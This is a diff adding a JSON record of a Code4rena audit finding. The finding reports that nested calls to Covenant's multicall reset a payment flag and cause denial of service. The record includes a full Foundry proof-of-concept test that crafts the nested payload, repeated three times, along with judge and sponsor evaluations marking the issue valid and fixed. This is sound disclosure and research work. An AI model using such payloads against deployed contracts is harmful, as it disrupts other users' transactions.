@@ -1,0 +1,128 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Covenant_d4uY8y2AMSs",
+    "audit_uid": "d4uY8y2AMSs",
+    "requested_submission_uid": "sdAjZKCqoTe",
+    "requested_finding_uid": "XdXZVhfNnGC",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Covenant_d4uY8y2AMSs/20260618_145249/findings.json",
+    "source_submission_uid": "sdAjZKCqoTe",
+    "source_finding_uid": "XdXZVhfNnGC",
+    "original_report_path": "Covenant_d4uY8y2AMSs\\low_valid_sdAjZKCqoTe.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "sdAjZKCqoTe",
+  "finding_uid": "XdXZVhfNnGC",
+  "finding_number": "29",
+  "title": "Nested `multicall` Breaks Payment Validation Logic, Leading to DoS",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "metaBug",
+  "body": "## Finding description and impact\n\nThe `Covenant.multicall` function uses a storage variable `_isMulticall` to signal to other functions (`mint`, `redeem`, `swap`, `updateState`) that they are being called as part of a batch. This flag allows these functions to bypass the strict `msg.value == msgValue` check in the `_checkPayment` helper, as the total `msg.value` is handled by the top-level `multicall`.\n\nThe `multicall` function sets `_isMulticall = true` at the beginning and `_isMulticall = false` at the end.\n\n```solidity\n// in Covenant.sol\nfunction multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {\n    uint256 balanceBeforeCall = address(this).balance - msg.value;\n\n    _isMulticall = true;\n    results = MulticallLib.multicall(data);\n    _isMulticall = false; // This is the problematic line in a re-entrant context\n\n    if (address(this).balance != balanceBeforeCall) revert Errors.E_IncorrectPayment();\n\n    return results;\n}\n```\n\nThe vulnerability occurs because `multicall` can be called recursively via `delegatecall`. If a user crafts a `multicall` where one of the inner calls is to `multicall` itself, the nested (inner) `multicall` will execute and set `_isMulticall` to `false` upon completion. When control returns to the outer `multicall`'s loop, the `_isMulticall` flag is now `false`, even though the outer batch operation is still in progress.\n\nAny subsequent call in the outer `multicall` that requires a fee (e.g., `updateState`) will now fail in `_checkPayment`, because `_isMulticall` is `false` and the `delegatecall`'s `msg.value` is 0, which will not match the required fee specified in the call parameters. This reverts the entire transaction.\n\n### Impact\nThis vulnerability allows for a Denial of Service on the `multicall` functionality. A malicious user can craft a transaction that includes a nested `multicall` to make any legitimate batch transaction that follows it (and requires a fee) fail. This breaks a core feature of the protocol designed for gas efficiency and user experience.\n## Recommended mitigation steps\n\nDescribe the best method(s) to mitigate the finding.",
+  "proof_of_concept": "The PoC is provided in `test/poc/Nested_Multicall_DoS.t.sol`. It demonstrates the vulnerability by crafting a `multicall` that contains a nested `multicall` followed by a call that requires a fee. The test expects the transaction to revert with `E_IncorrectPayment`, which it does, proving the DoS vector.\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\nimport {Covenant, MarketId, MarketParams, Errors} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {IPriceOracle} from \"../../src/interfaces/IPriceOracle.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LatentSwapLib} from \"../../src/periphery/libraries/LatentSwapLib.sol\";\n\n// A simple oracle that requires a fee for updates.\ncontract FeeOracle is IPriceOracle {\n    function name() external pure returns (string memory) { return \"FeeOracle\"; }\n    function getQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function getQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function previewGetQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function previewGetQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function updatePriceFeeds(address, address, bytes calldata) external payable {}\n    function getUpdateFee(address, address, bytes calldata) external view returns (uint128) { return 0.1 ether; }\n}\n\ncontract C4PoC is Test {\n    Covenant public covenant;\n    LatentSwapLEX public lex;\n    address internal _mockBaseAsset;\n    address internal _mockQuoteAsset;\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000);\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32 internal constant DURATION = 30 * 24 * 60 * 60;\n    int64 internal constant LN_RATE_BIAS = 5012540000000000;\n    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n    function setUp() public {\n        _mockBaseAsset = address(new MockERC20(address(this), \"MockBaseAsset\", \"MBA\", 18));\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQuoteAsset\", \"MQA\", 18));\n\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(address(this), address(covenant), P_MAX, P_MIN, P_LIM_H, P_LIM_MAX, LN_RATE_BIAS, DURATION, 0);\n        \n        covenant.setEnabledLEX(address(lex), true);\n    }\n\n    function test_NestedMulticallDoS() public {\n        // 1. Deploy and configure an oracle that requires a fee.\n        FeeOracle feeOracle = new FeeOracle();\n        covenant.setEnabledCurator(address(feeOracle), true);\n\n        // 2. Create a market that uses this oracle.\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: address(feeOracle),\n            lex: address(lex)\n        });\n        MarketId marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // 3. Determine the fee required for an updateState call.\n        uint256 fee = feeOracle.getUpdateFee(marketParams.baseToken, marketParams.quoteToken, \"\");\n        assertTrue(fee > 0);\n\n        // 4. Craft the malicious nested multicall payload.\n        bytes[] memory innerMulticallData = new bytes[](0);\n        bytes memory innerCall = abi.encodeWithSelector(covenant.multicall.selector, innerMulticallData);\n\n        bytes memory updateCall = abi.encodeWithSelector(\n            covenant.updateState.selector,\n            marketId,\n            marketParams,\n            bytes(\"\"),\n            fee\n        );\n\n        bytes[] memory outerMulticallData = new bytes[](2);\n        outerMulticallData[0] = innerCall;\n        outerMulticallData[1] = updateCall;\n\n        // 5. Expect the transaction to revert with E_IncorrectPayment.\n        vm.expectRevert(Errors.E_IncorrectPayment.selector);\n\n        // 6. Execute the multicall. This call will fail, demonstrating the DoS vulnerability.\n        covenant.multicall{value: fee}(outerMulticallData);\n    }\n}\n\n\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-10-covenant/blob/main/src/Covenant.sol#L518"
+  ],
+  "source_record": {
+    "project_id": "d4uY8y2AMSs",
+    "submission_index": "37",
+    "api_submission_id": "",
+    "uid": "sdAjZKCqoTe",
+    "number": "37",
+    "title": "Nested `multicall` Breaks Payment Validation Logic, Leading to DoS",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "metaBug",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-10-covenant/blob/main/src/Covenant.sol#L518"
+    ],
+    "body": "## Finding description and impact\n\nThe `Covenant.multicall` function uses a storage variable `_isMulticall` to signal to other functions (`mint`, `redeem`, `swap`, `updateState`) that they are being called as part of a batch. This flag allows these functions to bypass the strict `msg.value == msgValue` check in the `_checkPayment` helper, as the total `msg.value` is handled by the top-level `multicall`.\n\nThe `multicall` function sets `_isMulticall = true` at the beginning and `_isMulticall = false` at the end.\n\n```solidity\n// in Covenant.sol\nfunction multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {\n    uint256 balanceBeforeCall = address(this).balance - msg.value;\n\n    _isMulticall = true;\n    results = MulticallLib.multicall(data);\n    _isMulticall = false; // This is the problematic line in a re-entrant context\n\n    if (address(this).balance != balanceBeforeCall) revert Errors.E_IncorrectPayment();\n\n    return results;\n}\n```\n\nThe vulnerability occurs because `multicall` can be called recursively via `delegatecall`. If a user crafts a `multicall` where one of the inner calls is to `multicall` itself, the nested (inner) `multicall` will execute and set `_isMulticall` to `false` upon completion. When control returns to the outer `multicall`'s loop, the `_isMulticall` flag is now `false`, even though the outer batch operation is still in progress.\n\nAny subsequent call in the outer `multicall` that requires a fee (e.g., `updateState`) will now fail in `_checkPayment`, because `_isMulticall` is `false` and the `delegatecall`'s `msg.value` is 0, which will not match the required fee specified in the call parameters. This reverts the entire transaction.\n\n### Impact\nThis vulnerability allows for a Denial of Service on the `multicall` functionality. A malicious user can craft a transaction that includes a nested `multicall` to make any legitimate batch transaction that follows it (and requires a fee) fail. This breaks a core feature of the protocol designed for gas efficiency and user experience.\n## Recommended mitigation steps\n\nDescribe the best method(s) to mitigate the finding.",
+    "proof_of_concept": "The PoC is provided in `test/poc/Nested_Multicall_DoS.t.sol`. It demonstrates the vulnerability by crafting a `multicall` that contains a nested `multicall` followed by a call that requires a fee. The test expects the transaction to revert with `E_IncorrectPayment`, which it does, proving the DoS vector.\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\nimport {Covenant, MarketId, MarketParams, Errors} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {IPriceOracle} from \"../../src/interfaces/IPriceOracle.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LatentSwapLib} from \"../../src/periphery/libraries/LatentSwapLib.sol\";\n\n// A simple oracle that requires a fee for updates.\ncontract FeeOracle is IPriceOracle {\n    function name() external pure returns (string memory) { return \"FeeOracle\"; }\n    function getQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function getQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function previewGetQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function previewGetQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function updatePriceFeeds(address, address, bytes calldata) external payable {}\n    function getUpdateFee(address, address, bytes calldata) external view returns (uint128) { return 0.1 ether; }\n}\n\ncontract C4PoC is Test {\n    Covenant public covenant;\n    LatentSwapLEX public lex;\n    address internal _mockBaseAsset;\n    address internal _mockQuoteAsset;\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000);\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32 internal constant DURATION = 30 * 24 * 60 * 60;\n    int64 internal constant LN_RATE_BIAS = 5012540000000000;\n    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n    function setUp() public {\n        _mockBaseAsset = address(new MockERC20(address(this), \"MockBaseAsset\", \"MBA\", 18));\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQuoteAsset\", \"MQA\", 18));\n\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(address(this), address(covenant), P_MAX, P_MIN, P_LIM_H, P_LIM_MAX, LN_RATE_BIAS, DURATION, 0);\n        \n        covenant.setEnabledLEX(address(lex), true);\n    }\n\n    function test_NestedMulticallDoS() public {\n        // 1. Deploy and configure an oracle that requires a fee.\n        FeeOracle feeOracle = new FeeOracle();\n        covenant.setEnabledCurator(address(feeOracle), true);\n\n        // 2. Create a market that uses this oracle.\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: address(feeOracle),\n            lex: address(lex)\n        });\n        MarketId marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // 3. Determine the fee required for an updateState call.\n        uint256 fee = feeOracle.getUpdateFee(marketParams.baseToken, marketParams.quoteToken, \"\");\n        assertTrue(fee > 0);\n\n        // 4. Craft the malicious nested multicall payload.\n        bytes[] memory innerMulticallData = new bytes[](0);\n        bytes memory innerCall = abi.encodeWithSelector(covenant.multicall.selector, innerMulticallData);\n\n        bytes memory updateCall = abi.encodeWithSelector(\n            covenant.updateState.selector,\n            marketId,\n            marketParams,\n            bytes(\"\"),\n            fee\n        );\n\n        bytes[] memory outerMulticallData = new bytes[](2);\n        outerMulticallData[0] = innerCall;\n        outerMulticallData[1] = updateCall;\n\n        // 5. Expect the transaction to revert with E_IncorrectPayment.\n        vm.expectRevert(Errors.E_IncorrectPayment.selector);\n\n        // 6. Execute the multicall. This call will fail, demonstrating the DoS vulnerability.\n        covenant.multicall{value: fee}(outerMulticallData);\n    }\n}\n\n\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/d4uY8y2AMSs/submissions/37",
+    "raw": {
+      "auditUid": "d4uY8y2AMSs",
+      "createdAt": "2025-10-23T20:58:02.271Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "zwTN6osPvJo",
+          "userUid": "6gNcwqYnMhM",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-25T17:02:36.973Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "XdXZVhfNnGC"
+        },
+        {
+          "uid": "TBRTUe8BU8A",
+          "userUid": "6gNcwqYnMhM",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-25T17:02:40.795Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "XdXZVhfNnGC"
+        },
+        {
+          "uid": "wLheDLMpWmq",
+          "userUid": "6gNcwqYnMhM",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-29T09:36:19.526Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "sdAjZKCqoTe",
+          "findingUid": null
+        },
+        {
+          "uid": "MY9ZcgYKzFg",
+          "userUid": "xrsg7LtD2gr",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-11-05T02:47:07.408Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "XdXZVhfNnGC"
+        }
+      ],
+      "finding": {
+        "uid": "XdXZVhfNnGC",
+        "number": 29,
+        "duplicates": 12
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-11-05T02:47:07.408Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Nested `multicall` Breaks Payment Validation Logic, Leading to DoS",
+      "uid": "sdAjZKCqoTe",
+      "updatedAt": "2025-10-23T21:00:50.572Z",
+      "user": {
+        "uid": "vJ3svUjSpMQ",
+        "handle": "metaBug"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe `Covenant.multicall` function uses a storage variable `_isMulticall` to signal to other functions (`mint`, `redeem`, `swap`, `updateState`) that they are being called as part of a batch. This flag allows these functions to bypass the strict `msg.value == msgValue` check in the `_checkPayment` helper, as the total `msg.value` is handled by the top-level `multicall`.\n\nThe `multicall` function sets `_isMulticall = true` at the beginning and `_isMulticall = false` at the end.\n\n```solidity\n// in Covenant.sol\nfunction multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {\n    uint256 balanceBeforeCall = address(this).balance - msg.value;\n\n    _isMulticall = true;\n    results = MulticallLib.multicall(data);\n    _isMulticall = false; // This is the problematic line in a re-entrant context\n\n    if (address(this).balance != balanceBeforeCall) revert Errors.E_IncorrectPayment();\n\n    return results;\n}\n```\n\nThe vulnerability occurs because `multicall` can be called recursively via `delegatecall`. If a user crafts a `multicall` where one of the inner calls is to `multicall` itself, the nested (inner) `multicall` will execute and set `_isMulticall` to `false` upon completion. When control returns to the outer `multicall`'s loop, the `_isMulticall` flag is now `false`, even though the outer batch operation is still in progress.\n\nAny subsequent call in the outer `multicall` that requires a fee (e.g., `updateState`) will now fail in `_checkPayment`, because `_isMulticall` is `false` and the `delegatecall`'s `msg.value` is 0, which will not match the required fee specified in the call parameters. This reverts the entire transaction.\n\n### Impact\nThis vulnerability allows for a Denial of Service on the `multicall` functionality. A malicious user can craft a transaction that includes a nested `multicall` to make any legitimate batch transaction that follows it (and requires a fee) fail. This breaks a core feature of the protocol designed for gas efficiency and user experience.\n## Recommended mitigation steps\n\nDescribe the best method(s) to mitigate the finding.",
+      "proofOfConcept": "The PoC is provided in `test/poc/Nested_Multicall_DoS.t.sol`. It demonstrates the vulnerability by crafting a `multicall` that contains a nested `multicall` followed by a call that requires a fee. The test expects the transaction to revert with `E_IncorrectPayment`, which it does, proving the DoS vector.\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity ^0.8.30;\n\nimport \"forge-std/Test.sol\";\nimport {Covenant, MarketId, MarketParams, Errors} from \"../../src/Covenant.sol\";\nimport {LatentSwapLEX} from \"../../src/lex/latentswap/LatentSwapLEX.sol\";\nimport {IPriceOracle} from \"../../src/interfaces/IPriceOracle.sol\";\nimport {MockERC20} from \"../mocks/MockERC20.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LatentSwapLib} from \"../../src/periphery/libraries/LatentSwapLib.sol\";\n\n// A simple oracle that requires a fee for updates.\ncontract FeeOracle is IPriceOracle {\n    function name() external pure returns (string memory) { return \"FeeOracle\"; }\n    function getQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function getQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function previewGetQuote(uint256 inAmount, address, address) external view returns (uint256) { return inAmount; }\n    function previewGetQuotes(uint256 inAmount, address, address) external view returns (uint256, uint256) { return (inAmount, inAmount); }\n    function updatePriceFeeds(address, address, bytes calldata) external payable {}\n    function getUpdateFee(address, address, bytes calldata) external view returns (uint128) { return 0.1 ether; }\n}\n\ncontract C4PoC is Test {\n    Covenant public covenant;\n    LatentSwapLEX public lex;\n    address internal _mockBaseAsset;\n    address internal _mockQuoteAsset;\n    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000);\n    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);\n    uint32 internal constant DURATION = 30 * 24 * 60 * 60;\n    int64 internal constant LN_RATE_BIAS = 5012540000000000;\n    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);\n    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);\n\n    function setUp() public {\n        _mockBaseAsset = address(new MockERC20(address(this), \"MockBaseAsset\", \"MBA\", 18));\n        _mockQuoteAsset = address(new MockERC20(address(this), \"MockQuoteAsset\", \"MQA\", 18));\n\n        covenant = new Covenant(address(this));\n        lex = new LatentSwapLEX(address(this), address(covenant), P_MAX, P_MIN, P_LIM_H, P_LIM_MAX, LN_RATE_BIAS, DURATION, 0);\n        \n        covenant.setEnabledLEX(address(lex), true);\n    }\n\n    function test_NestedMulticallDoS() public {\n        // 1. Deploy and configure an oracle that requires a fee.\n        FeeOracle feeOracle = new FeeOracle();\n        covenant.setEnabledCurator(address(feeOracle), true);\n\n        // 2. Create a market that uses this oracle.\n        MarketParams memory marketParams = MarketParams({\n            baseToken: _mockBaseAsset,\n            quoteToken: _mockQuoteAsset,\n            curator: address(feeOracle),\n            lex: address(lex)\n        });\n        MarketId marketId = covenant.createMarket(marketParams, hex\"\");\n\n        // 3. Determine the fee required for an updateState call.\n        uint256 fee = feeOracle.getUpdateFee(marketParams.baseToken, marketParams.quoteToken, \"\");\n        assertTrue(fee > 0);\n\n        // 4. Craft the malicious nested multicall payload.\n        bytes[] memory innerMulticallData = new bytes[](0);\n        bytes memory innerCall = abi.encodeWithSelector(covenant.multicall.selector, innerMulticallData);\n\n        bytes memory updateCall = abi.encodeWithSelector(\n            covenant.updateState.selector,\n            marketId,\n            marketParams,\n            bytes(\"\"),\n            fee\n        );\n\n        bytes[] memory outerMulticallData = new bytes[](2);\n        outerMulticallData[0] = innerCall;\n        outerMulticallData[1] = updateCall;\n\n        // 5. Expect the transaction to revert with E_IncorrectPayment.\n        vm.expectRevert(Errors.E_IncorrectPayment.selector);\n\n        // 6. Execute the multicall. This call will fail, demonstrating the DoS vulnerability.\n        covenant.multicall{value: fee}(outerMulticallData);\n    }\n}\n\n\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-10-covenant/blob/main/src/Covenant.sol#L518",
+      "number": 37,
+      "aiExplanation": null,
+      "_index": 37
+    }
+  }
+}
